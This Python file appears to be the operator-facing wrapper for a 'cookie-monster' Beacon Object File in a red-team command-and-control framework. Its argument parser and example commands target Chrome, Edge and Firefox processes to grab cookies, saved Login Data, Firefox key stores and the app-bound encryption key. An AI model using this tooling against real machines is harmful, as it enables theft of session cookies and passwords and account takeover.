import os
from typing import List, Tuple

from outflank_stage1.task.base_bof_task import BaseBOFTask
from outflank_stage1.task.enums import BOFArgumentEncoding
from outflank_stage1.task.exceptions import TaskInvalidArgumentsException


_SCRIPT_BASE_PATH = os.path.dirname(os.path.abspath(__file__))


class CookieMonsterBOF(BaseBOFTask):
    def __init__(self):
        super().__init__("cookie-monster", base_binary_name="cookie-monster-bof")
        self.set_base_path(_SCRIPT_BASE_PATH)

        self.parser.description = "Locate and copy the cookie file used for Edge/Chrome/Firefox"

        # Create mutually exclusive group for browser/mode selection
        mode_group = self.parser.add_mutually_exclusive_group(required=True)
        mode_group.add_argument(
            "--chrome",
            action="store_true",
            help="Target Chrome browser (all running processes)"
        )
        mode_group.add_argument(
            "--edge",
            action="store_true",
            help="Target Edge browser (all running processes)"
        )
        mode_group.add_argument(
            "--firefox",
            action="store_true",
            help="Target Firefox browser (profiles.ini, key4.db, logins.json)"
        )
        mode_group.add_argument(
            "--system",
            nargs=2,
            metavar=("LOCAL_STATE_PATH", "PID"),
            help="Decrypt chromium browser without injecting (requires Local State file path and user process PID)"
        )
        mode_group.add_argument(
            "--chromeCookiePID",
            type=int,
            metavar="PID",
            help="Target specific Chrome process with handle to cookies"
        )
        mode_group.add_argument(
            "--chromeLoginDataPID",
            type=int,
            metavar="PID",
            help="Target specific Chrome process with handle to Login Data"
        )
        mode_group.add_argument(
            "--edgeCookiePID",
            type=int,
            metavar="PID",
            help="Target specific Edge process with handle to cookies"
        )
        mode_group.add_argument(
            "--edgeLoginDataPID",
            type=int,
            metavar="PID",
            help="Target specific Edge process with handle to Login Data"
        )

        # Optional flags
        self.parser.add_argument(
            "--key-only",
            action="store_true",
            help="Only retrieve the app bound encryption key (no cookie/login data download)"
        )
        self.parser.add_argument(
            "--cookie-only",
            action="store_true",
            help="Only retrieve the Cookie file (no Login Data or key retrieval)"
        )
        self.parser.add_argument(
            "--login-data-only",
            action="store_true",
            help="Only retrieve the Login Data file (no Cookie or key retrieval)"
        )
        self.parser.add_argument(
            "--copy-file",
            metavar="FOLDER_PATH",
            default="",
            help="Copy Cookie and Login Data to specified folder (disk-based, not fileless)"
        )

        self.parser.epilog = (
            "Example usage:\n"
            "  cookie-monster --chrome\n"
            "  cookie-monster --edge --key-only\n"
            "  cookie-monster --system \"C:\\Users\\User\\AppData\\Local\\Google\\Chrome\\User Data\\Local State\" 1234\n"
            "  cookie-monster --firefox\n"
            "  cookie-monster --chromeCookiePID 5678\n"
            "  cookie-monster --chromeLoginDataPID 5678\n"
            "  cookie-monster --edgeCookiePID 9012\n"
            "  cookie-monster --edgeLoginDataPID 9012\n"
            "  cookie-monster --chrome --cookie-only\n"
            "  cookie-monster --edge --copy-file \"C:\\Temp\"\n\n"
            "Notes:\n"
            "  - --key-only cannot be combined with --cookie-only or --login-data-only\n"
            "  - --key-only cannot be used with --copy-file\n"
            "  - --login-data-only cannot be used with cookie PID options\n"
            "  - --cookie-only cannot be used with login data PID options\n\n"
            "OC2 Users:\n"
            "  OC2 does not support automatic file downloads like Cobalt Strike.\n"
            "  Cookie/Login Data files will be displayed in BOF output but NOT saved automatically.\n"
            "  Use --copy-file <path> to save files to disk on the target system.\n"
        )

    def validate_arguments(self, arguments: List[str]):
        super().validate_arguments(arguments)

        parser_arguments = self.parser.parse_args(arguments)

        # Validate flag combinations
        if parser_arguments.key_only and (parser_arguments.cookie_only or parser_arguments.login_data_only):
            raise TaskInvalidArgumentsException(
                "--key-only cannot be used with --cookie-only or --login-data-only"
            )

        if parser_arguments.key_only and parser_arguments.copy_file:
            raise TaskInvalidArgumentsException(
                "--key-only cannot be used with --copy-file"
            )

        if parser_arguments.login_data_only and (parser_arguments.edgeCookiePID or parser_arguments.chromeCookiePID):
            raise TaskInvalidArgumentsException(
                "--login-data-only cannot be used with --edgeCookiePID or --chromeCookiePID"
            )

        if parser_arguments.cookie_only and (parser_arguments.edgeLoginDataPID or parser_arguments.chromeLoginDataPID):
            raise TaskInvalidArgumentsException(
                "--cookie-only cannot be used with --edgeLoginDataPID or --chromeLoginDataPID"
            )

        # Validate --system arguments
        if parser_arguments.system:
            local_state_path, pid = parser_arguments.system
            try:
                pid_int = int(pid)
                if pid_int <= 0:
                    raise TaskInvalidArgumentsException(f"Invalid PID: {pid}. PID must be a positive integer.")
            except ValueError:
                raise TaskInvalidArgumentsException(f"Invalid PID: {pid}. PID must be a valid integer.")

        # Validate PID arguments
        if parser_arguments.chromeCookiePID and parser_arguments.chromeCookiePID <= 0:
            raise TaskInvalidArgumentsException(f"Invalid PID: {parser_arguments.chromeCookiePID}")
        if parser_arguments.chromeLoginDataPID and parser_arguments.chromeLoginDataPID <= 0:
            raise TaskInvalidArgumentsException(f"Invalid PID: {parser_arguments.chromeLoginDataPID}")
        if parser_arguments.edgeCookiePID and parser_arguments.edgeCookiePID <= 0:
            raise TaskInvalidArgumentsException(f"Invalid PID: {parser_arguments.edgeCookiePID}")
        if parser_arguments.edgeLoginDataPID and parser_arguments.edgeLoginDataPID <= 0:
            raise TaskInvalidArgumentsException(f"Invalid PID: {parser_arguments.edgeLoginDataPID}")

    def run(self, arguments: List[str]):
        parser_arguments = self.parser.parse_args(arguments)

        # Display warning if files will be generated (not --key-only) and --copy-file is not used
        if not parser_arguments.key_only and not parser_arguments.copy_file:
            self.append_response(
                "[!] WARNING: OC2 does not support automatic file downloads like Cobalt Strike.\n"
                "[!] Cookie/Login Data files will be displayed in BOF output but NOT saved automatically.\n"
                "[!] Use --copy-file <path> to save files to disk on the target system.\n\n"
            )

        # Execute the BOF
        super().run(arguments)

    def _encode_arguments_bof(self, arguments: List[str]) -> List[Tuple[BOFArgumentEncoding, str]]:
        parser_arguments = self.parser.parse_args(arguments)

        # Initialize all flags
        chrome = 1 if parser_arguments.chrome else 0
        edge = 1 if parser_arguments.edge else 0
        system = 1 if parser_arguments.system else 0
        firefox = 1 if parser_arguments.firefox else 0
        chromeCookiePID = 1 if parser_arguments.chromeCookiePID else 0
        chromeLoginDataPID = 1 if parser_arguments.chromeLoginDataPID else 0
        edgeCookiePID = 1 if parser_arguments.edgeCookiePID else 0
        edgeLoginDataPID = 1 if parser_arguments.edgeLoginDataPID else 0

        # Get PID value
        pid = 0
        local_state_path = ""
        if parser_arguments.system:
            local_state_path, pid_str = parser_arguments.system
            local_state_path = local_state_path.strip('"').strip("'")
            pid = int(pid_str)
        elif parser_arguments.chromeCookiePID:
            pid = parser_arguments.chromeCookiePID
        elif parser_arguments.chromeLoginDataPID:
            pid = parser_arguments.chromeLoginDataPID
        elif parser_arguments.edgeCookiePID:
            pid = parser_arguments.edgeCookiePID
        elif parser_arguments.edgeLoginDataPID:
            pid = parser_arguments.edgeLoginDataPID

        # Get optional flags
        keyOnly = 1 if parser_arguments.key_only else 0
        cookieOnly = 1 if parser_arguments.cookie_only else 0
        loginDataOnly = 1 if parser_arguments.login_data_only else 0
        copyFile = parser_arguments.copy_file.strip('"').strip("'") if parser_arguments.copy_file else ""

        # BOF expects: iiiiiiiiiziiiz
        # (chrome, edge, system, firefox, chromeCookiePID, chromeLoginDataPID,
        #  edgeCookiePID, edgeLoginDataPID, pid, path, keyOnly, cookieOnly, loginDataOnly, copyFile)
        return [
            (BOFArgumentEncoding.INT, chrome),
            (BOFArgumentEncoding.INT, edge),
            (BOFArgumentEncoding.INT, system),
            (BOFArgumentEncoding.INT, firefox),
            (BOFArgumentEncoding.INT, chromeCookiePID),
            (BOFArgumentEncoding.INT, chromeLoginDataPID),
            (BOFArgumentEncoding.INT, edgeCookiePID),
            (BOFArgumentEncoding.INT, edgeLoginDataPID),
            (BOFArgumentEncoding.INT, pid),
            (BOFArgumentEncoding.STR, local_state_path),
            (BOFArgumentEncoding.INT, keyOnly),
            (BOFArgumentEncoding.INT, cookieOnly),
            (BOFArgumentEncoding.INT, loginDataOnly),
            (BOFArgumentEncoding.STR, copyFile),
        ]
